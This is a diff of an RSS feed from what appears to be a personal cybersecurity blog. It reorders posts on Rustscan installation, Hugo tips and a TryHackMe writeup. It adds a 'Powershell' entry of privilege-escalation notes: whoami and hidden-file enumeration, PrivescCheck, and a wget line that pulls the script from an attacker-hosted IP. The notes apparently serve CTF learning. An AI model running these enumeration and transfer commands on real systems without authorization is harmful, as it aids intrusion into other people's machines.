@@ -11,18 +11,7 @@
     </image>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Sat, 25 May 2024 09:47:04 +1000</lastBuildDate><atom:link href="//localhost:1313/index.xml" rel="self" type="application/rss+xml" />
-    <item>
-      <title>Rustscan</title>
-      <link>//localhost:1313/rustscan/</link>
-      <pubDate>Sat, 25 May 2024 09:47:04 +1000</pubDate>
-      
-      <guid>//localhost:1313/rustscan/</guid>
-      <description>Make sure you&amp;rsquo;ve Installed Docker.
-Here&amp;rsquo;s a bash script to automate the installation:
-#!/bin/bash # Update, install and enable Docker sudo apt update -y &amp;amp;&amp;amp; sudo apt upgrade -y sudo apt install -y docker.io sudo systemctl enable docker --now # Add current use into docker group sudo usermod -aG docker $USER # Pull latest Rustscan docker pull rustscan/rustscan:latest # Create a ZSH Aliases File touch ~/.zsh_aliases # Add it to ZSH RC echo &amp;#34;&amp;#34;&amp;#34;if [ -f ~/.</description>
-    </item>
-    
+    <lastBuildDate>Fri, 24 May 2024 12:05:12 +1000</lastBuildDate><atom:link href="//localhost:1313/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>CyberLens TryHackMe Writeup</title>
       <link>//localhost:1313/cyberlens/</link>
@@ -89,19 +78,6 @@ Previously, I&amp;rsquo;ve always used Kali Rolling inside of VirtualBox. But le
 Why? Mainly the boot times, slow browsing and general laggy annoyances.
 I want a fast, simple system without the need to boot a VM and deal with stutters.
 The thinking is, use Windows Subset for Linux (WSL) with headless Kali Linux.</description>
-    </item>
-    
-    <item>
-      <title>Hugo</title>
-      <link>//localhost:1313/hugo/</link>
-      <pubDate>Fri, 15 Dec 2023 13:14:04 +1000</pubDate>
-      
-      <guid>//localhost:1313/hugo/</guid>
-      <description>Hugo is great, but noticing some odd bits and bops.
-Alias(es) Here&amp;rsquo;s what I use for my urls:
-url: hugoalias: # aliases for multiple- post/hugo- But in order for aliases to work, I have to change aslias to asliases, save. Then change it back to aslias. Strange.
-Markdown All in One Hands down the best extension to use within VSCode is Markdown All in One.
-Paste links over text for automatic linking Continues ordered and unordered lists when typing </description>
     </item>
     
     <item>
@@ -1028,6 +1004,20 @@ Disclaimer, you’ve received this newsletter (read online version) as you’ve 
     </item>
     
     <item>
+      <title>Hugo</title>
+      <link>//localhost:1313/hugo/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/hugo/</guid>
+      <description>Full Supported Languages List
+Alias(es)
+Here&amp;rsquo;s what I use for my urls:
+url: hugoalias: # aliases for multiple- post/hugo- But in order for aliases to work, I have to change aslias to asliases, save. Then change it back to aslias. Strange.
+Markdown All in One Hands down the best extension to use within VSCode is Markdown All in One.
+Paste links over text for automatic linking Continues ordered and unordered lists when typing </description>
+    </item>
+    
+    <item>
       <title>In Progress</title>
       <link>//localhost:1313/in-progress/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -1122,6 +1112,15 @@ Why I Do&amp;hellip; What I Do If you didn&amp;rsquo;t know, I&amp;rsquo;m an I.
     </item>
     
     <item>
+      <title>Powershell</title>
+      <link>//localhost:1313/powershell/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/powershell/</guid>
+      <description>whoami /priv whoami /all gci -recurse . gci -recurse -hidden . Manual Enum - C:\Users - C:\ - C:\Windows\Temp Auto Enum - Winpeas - PrivesCheck (https://github.com/itm4n/PrivescCheck) - . .\PrivescCheck.ps1; Invoke-PrivescCheck Transfer - wget http://$ip/ -UseBasicParsing -OutFile $file.ext wget http://10.4.59.208:8000/PrivescCheck.ps1 -UseBasicParsing -OutFile PrivescCheck.ps1``` --- Thanks for reading </description>
+    </item>
+    
+    <item>
       <title>Put Yourself Out</title>
       <link>//localhost:1313/put-yourself-out/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -1143,6 +1142,17 @@ How’s your week been?
 Professionally, it’s a good one for me. I’ve been back into work by setting up students for their course.
 Personally, I’ve been slightly neglecting my morning routine and slipping on positive habits. I think getting back into work is draining me more than I was expecting. I need to find a new balance being back in work mode.
 As always, aligning myself with my 2020 yearly review I’m writing to you.</description>
+    </item>
+    
+    <item>
+      <title>Rustscan</title>
+      <link>//localhost:1313/rustscan/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/rustscan/</guid>
+      <description>Installing Docker.
+Bash script:
+#!/bin/bash # Update, install and enable Docker sudo apt update -y &amp;amp;&amp;amp; sudo apt upgrade -y sudo apt install -y docker.io sudo systemctl enable docker --now # Add current use into docker group sudo usermod -aG docker $USER # Pull latest Rustscan docker pull rustscan/rustscan:latest # Create a ZSH Aliases File touch ~/.zsh_aliases # Add it to ZSH RC echo &amp;#34;&amp;#34;&amp;#34;if [ -f ~/.zsh_aliases ]; then .</description>
     </item>
     
     <item>
